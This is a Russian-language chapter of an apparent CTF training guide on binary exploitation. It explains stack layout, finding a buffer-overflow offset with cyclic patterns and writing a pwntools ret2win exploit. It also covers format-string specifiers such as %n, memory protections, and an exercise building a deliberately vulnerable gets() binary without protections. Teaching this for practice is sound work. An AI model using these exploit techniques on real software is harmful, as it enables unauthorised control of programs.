# Глава 9 (hard). Pwn: ret2win и защиты

Это уже региональный уровень (🔺). Полноценный pwn сложен, но простейший **ret2win** (перезаписать
адрес возврата, чтобы прыгнуть в спрятанную функцию) реально разобрать.

## 1. Как лежит стек и почему ret2win работает

Стек рисуют "как принято": старшие адреса сверху, младшие снизу, и сам стек растёт вниз (к младшим
адресам). Когда вызывается функция с локальным массивом `buffer[N]`, её кадр выглядит так:

```
              СТАРШИЕ адреса
           +---------------------------+
           |      ... выше по стеку    |
           +---------------------------+
   rip --> |  saved RIP (адрес возвр.) |  8 байт   <= ЦЕЛЬ: подменим ->
           +---------------------------+              ret прыгнет в win()
   rbp --> |  saved RBP                |  8 байт
           +---------------------------+
  buffer -> |  buffer[N] (локальный)     |  <= сюда читается ввод;
           |  "AAAAAAAA...."           |     RSP указывает в низ кадра
           +---------------------------+
              МЛАДШИЕ адреса

   gets()/strcpy пишут ввод снизу вверх:
        buffer  ->  saved RBP  ->  saved RIP
   переполнил буфер -> затёр RBP -> дотянулся до saved RIP
```

Почему цель именно **saved RIP**. Когда функция заканчивается, инструкция `ret` снимает со стека
saved RIP и прыгает по этому адресу - туда, откуда функцию позвали. Если мы вводом перезаписали saved
RIP адресом функции `win()`, то на `ret` программа "вернётся" не назад, а прямо в `win()` и напечатает
флаг. Это и есть **перехват управления**. (saved RBP по пути затирается тоже, но он лишь восстанавливает
кадр вызвавшего - сам по себе флага не даёт.)

Главный вопрос - **смещение (offset)**: сколько байт от начала `buffer` до saved RIP. Его и ищут
циклическим паттерном (п. 2): смотрят, какой кусок паттерна оказался на месте адреса возврата.

## 2. Как найти длину переполнения (offset)

Нужно узнать, сколько байт ввести до адреса возврата. Используем "циклический" паттерн: при падении
смотрим, какой кусок паттерна оказался в регистре адреса возврата.

```python
from pwn import *
# создать уникальный паттерн длиной 200
cyclic_pattern = cyclic(200)
# ... отправить его в программу, программа упадёт ...
# в gdb/по дампу увидеть значение, попавшее в RSP/RIP, например 0x6161616c
offset = cyclic_find(b'laaa')        # надёжнее искать по байтам: на 64 бит cyclic_find(число) бывает капризен
print(offset)
```

Вручную то же: отправляешь `AAAA...` разной длины, ищешь, при какой длине затирается адрес возврата.

## 3. ret2win: прыгнуть в спрятанную функцию

Типичная учебная задача: в программе есть функция `win()` (печатает флаг), но её "никто не
вызывает". Цель - перезаписать адрес возврата её адресом.

```python
from pwn import *

elf = ELF("./vuln")                     # загрузить бинарь
win = elf.symbols["win"]                 # адрес функции win()
offset = 40                              # найден на шаге 2

payload  = b"A" * offset                 # заполнить буфер до адреса возврата
payload += p64(win)                      # перезаписать адрес возврата адресом win()
#          ^ p64 = упаковать 64-битный адрес в little-endian (см. 03-python/hard.md)

io = process("./vuln")                   # или remote("host", port)
io.sendline(payload)
io.interactive()                         # получаем вывод win() - там флаг
```

⚠️ Байты адреса непечатные - поэтому payload отправляют **скриптом**, а не руками. `p64()` из
pwntools делает ровно `struct.pack("<Q", addr)`.

💡 Если `win()` найден верно, но программа всё равно падает с SIGSEGV (часто на инструкции `movaps`
внутри `printf`) - стек не выровнен по 16 байт. Добавь перед адресом `win` "пустой" гаджет `ret`:
```python
ret = 0x40101a                                # адрес инструкции ret (найти в objdump/ropper)
payload = b"A"*offset + p64(ret) + p64(win)   # лишний ret выравнивает стек
```

## 4. Отладка под pwndbg 🔺

`pwndbg` - надстройка над gdb (как и `gef`): тот же gdb, но с человеческим выводом. При установке она
прописывается в `~/.gdbinit`, поэтому обычный `gdb ./vuln` подхватывает её сам - приглашение меняется
на `pwndbg>`. Отдельно запускать ничего не надо.

Чем полезна именно в ret2win:
- **context** - на каждой остановке сам показывает регистры, дизассемблер и стек. Сразу видно RIP,
  RSP и что на них лежит.
- встроенный **cyclic** - отдельный pwntools не нужен: `cyclic 200` печатает паттерн, а
  `cyclic -l <кусок>` по куску сразу выдаёт offset.
- **telescope $rsp** (или `stack`) - показать вершину стека столбиком с адресами: видно, какое слово
  уйдёт в RIP на `ret`.

Синтетический воркфлоу на учебном BOF (программа читает ввод в буфер и падает):

```
$ gdb ./vuln                 # pwndbg подхватится сам, если установлен
pwndbg> cyclic 200           # напечатать уникальный паттерн из 200 байт
aaaabaaacaaadaaaeaaaf...     # скопировать его
pwndbg> run                  # запустить; на запрос ввода вставить паттерн
...
 program received signal SIGSEGV   # переполнили буфер, программа упала
pwndbg> context              # (обычно показывается сам) регистры + стек
 ... RIP  0x6161616b ('kaaa')      # в RIP лёг кусок нашего паттерна
pwndbg> cyclic -l kaaa       # по этому куску найти смещение (или: cyclic -l 0x6161616b)
40                            # <- offset: столько байт до saved RIP
```

Дальше собираешь ввод как в п. 3: `b"A"*40 + p64(win)`.

💡 `telescope $rsp 8` печатает 8 слов со стека вместе с адресами - удобно глазами убедиться, что на
месте адреса возврата действительно твой паттерн и offset верный.

⚠️ pwndbg/gef может не оказаться на выданной ВМ. Тогда тот же разбор делается голым gdb
(`info registers`, `x/20gx $rsp`, точки останова) - см. `08-reverse/hard.md`, п. 1. А паттерн и offset
без pwntools считаются даже на чистом Python (последовательность де Брёйна), просто руками дольше.

## 5. Format string - кратко

Если программа печатает твой ввод через `printf(ввод)` (без формата), спецификаторы работают:
```
%p %p %p %p        <- читать данные со стека (утечка адресов/канарейки)
%s                 <- прочитать строку по адресу
%n                 <- ЗАПИСАТЬ число (опасно: позволяет перезапись памяти)
```
Признак - твой ввод печатается, и `%p` выводит шестнадцатеричные значения вместо текста.

## 6. Защиты (почему "простой" BOF не всегда проходит)

| Защита | Что делает | Как влияет |
|---|---|---|
| **NX** | стек не исполняемый | нельзя положить свой код в буфер -> используют ret2win/ROP |
| **Stack Canary** | "канарейка" перед адресом возврата | при затирании программа падает; нужно сначала узнать канарейку (утечкой) |
| **ASLR / PIE** | адреса случайны при каждом запуске | нужно сначала "слить" адрес, потом считать остальные |
| **RELRO** | защита таблицы GOT | усложняет перезапись функций |

Проверить защиты: `checksec ./vuln` (из pwntools).

🔺🔺 Обход канарейки и ASLR, ROP-цепочки - это уже олимпиады выше регионального. На регионе обычно
дают ret2win без канарейки/PIE (или с подсказками), и схемы из п. 2-3 хватает.

🎯 **Тренировка (hard).** Скомпилируй уязвимую программу без защит
(`gcc -fno-stack-protector -no-pie -o vuln vuln.c`) с функцией `win()` и `gets(buf)`. Запусти под
`gdb`+pwndbg, скорми `cyclic 200`, по значению в RIP найди offset через `cyclic -l`, собери payload
`b"A"*offset + p64(win)` и получи вызов `win()`.
